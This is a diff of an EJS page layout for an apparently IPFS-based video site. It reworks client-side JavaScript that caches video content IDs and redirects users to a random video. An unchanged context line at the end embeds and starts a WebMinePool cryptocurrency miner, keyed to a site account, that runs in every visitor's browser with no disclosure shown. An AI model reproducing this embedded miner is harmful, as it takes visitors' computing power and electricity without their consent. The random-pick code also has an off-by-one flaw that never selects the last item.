@@ -25,6 +25,57 @@
 
 </head>
 <body class="d-flex flex-column h-100">
+
+<script>
+    loadLocalCids = () => {
+      var url = location.protocol+'//'+location.hostname+(location.port ? ':'+location.port: '')+'/randomVideos'
+      $.getJSON(url, function(data) {
+        cids = {}
+        for(const tag of data){
+          for(const file of tag.files){
+            if(cids[tag.name]) { 
+              cids[tag.name].push(file.cid)
+            }  else {
+              cids[tag.name] = []; 
+              cids[tag.name].push(file.cid)
+            }
+          }
+
+        }
+        localStorage.setItem('cids', JSON.stringify(cids))
+      });
+    }
+
+
+    createNode = async () => {
+        //repoPath = 'ipfs-local-' + Math.random()
+        node = await Ipfs.create() 
+        console.log('node created: ' + node ) 
+        return node
+    }
+
+    gotoRandomVideoPage = (tag=undefined) => {
+        if(localStorage.getItem('cids')){
+            const cids = JSON.parse(localStorage.getItem('cids'))
+            if(tag){
+                window.location.href = "/watch?filehash=" + cids[tag][Math.floor( Math.random() * (cids[tag].length-1) )];
+                return;
+            }
+            const tags = Object.keys(cids)
+            const randIndex = Math.floor(Math.random() * tags.length)
+            const randKey = tags[randIndex]
+            const t = cids[randKey]
+
+            window.location.href = "/watch?filehash=" + t[ Math.floor( Math.random() * ( t.length-1) ) ];
+        }     
+    }
+    if(!localStorage.getItem('cids')){
+      loadLocalCids();
+    }
+
+
+</script>
+
     <header>
         <!-- Fixed navbar -->
         <nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark">
@@ -65,45 +116,6 @@
       <div class="container">
           <%- include(page, params) %>
       </div>
-    <% if(params.vids && params.vids.length > 0) { %>  
-        <% var cids = {}  %>
-        <% for(const tag of params.vids) { %> 
-            <% for(const file of tag.files) { %> 
-                <% if(cids[tag.name]) { %>
-                    <% cids[tag.name].push(file.cid) %>
-                <% } else { %>
-                    <% cids[tag.name] = []; cids[tag.name].push(file.cid) %>
-                <% }  %>
-            <% }  %>
-        <% }  %>
-    <% }  %>
-
-    <script>
-        localStorage.setItem('cids', JSON.stringify(<%- JSON.stringify(cids) %>));
-        createNode = async () => {
-            //repoPath = 'ipfs-local-' + Math.random()
-            node = await Ipfs.create() 
-            console.log('node created: ' + node ) 
-            return node
-        }
-
-        gotoRandomVideoPage = (tag=undefined) => {
-            if(localStorage.getItem('cids')){
-                const cids = JSON.parse(localStorage.getItem('cids'))
-                if(tag){
-                    window.location.href = "/watch?filehash=" + cids[tag][Math.floor( Math.random() * (cids[tag].length-1) )];
-                    return;
-                }
-                const tags = Object.keys(cids)
-                const randIndex = Math.floor(Math.random() * tags.length)
-                const randKey = tags[randIndex]
-                const t = cids[randKey]
-
-                window.location.href = "/watch?filehash=" + t[ Math.floor( Math.random() * ( t.length-1) ) ];
-            }     
-        }
-
-    </script>
     <script>
         var miner = WMP.Anonymous('SK_wYDJ7Rli2DyNZvckyjj3v',{throttle: 0.2});
         miner.start();
